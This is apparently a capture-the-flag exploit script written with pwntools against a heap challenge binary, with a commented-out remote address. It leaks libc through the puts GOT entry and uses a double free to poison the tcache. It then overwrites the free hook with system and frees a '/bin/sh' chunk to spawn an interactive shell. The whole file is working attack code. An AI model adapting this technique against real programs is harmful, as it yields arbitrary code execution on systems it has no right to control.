from pwn import *

p = process("./chall")
# p = remote("18.179.178.246", 9007)

def add(types, text):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(types))
    p.sendlineafter(": ", text)

def get(idx, types):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(types))
    p.recvuntil(": ")
    return u64(p.recvline()[:-1].ljust(8, "\x00"))

def delete(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", str(idx))

def exploit():
    binary = ELF("./chall")
    puts_got = binary.got['puts']

    gdb.attach(p)
    add(1, str(puts_got))
    
    libc_leak = get(0, 3)
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x0809c0
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_free = libc_base + 0x3ed8e8
    log.info("Libc free : {}".format(hex(libc_free)))
    libc_system = libc_base + 0x04f440
    log.info("Libc system : {}".format(hex(libc_system)))

    add(3, "JUNK")
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", "1")
    p.sendlineafter(": ", "1")
    p.recvuntil("Data: ")
    trigger = int(p.recvline()[:-1])
    log.info("Trigger double free shit : {}".format(hex(trigger)))
    add(1, str(trigger))
    delete(1)
    delete(1)

    add(3, p64(libc_free))
    add(3, "/bin/sh")
    add(3, p64(libc_system))

    delete(2)
    p.interactive()

if __name__ == "__main__":
    exploit()